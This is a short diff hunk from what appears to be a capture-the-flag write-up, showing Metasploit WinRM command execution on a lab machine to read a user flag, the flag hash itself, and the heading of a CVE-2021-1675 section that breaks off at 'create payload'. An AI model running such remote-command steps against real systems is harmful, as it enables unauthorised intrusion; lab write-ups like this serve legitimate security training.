@@ -78,7 +78,7 @@ Command=ToggleDesktop
 + msfconsole> use auxiliary/scanner/winrm/winrm_cmd see [winRM_cmd](Screenshots/driver_winrm_cmd.png))
   + set cmd pwd :: C:\Users\tony\Documents
   + set cmd "cd ..\Desktop\ ; more user.txt" ![pwd_enum](Screenshots/driver_pwd_enum.png)
-  + user:: 95d6e576b403ac91befbc9c0ab70463d
+user:: 95d6e576b403ac91befbc9c0ab70463d
 
 ##**CVE-2021-1675**##
 create payload:: 
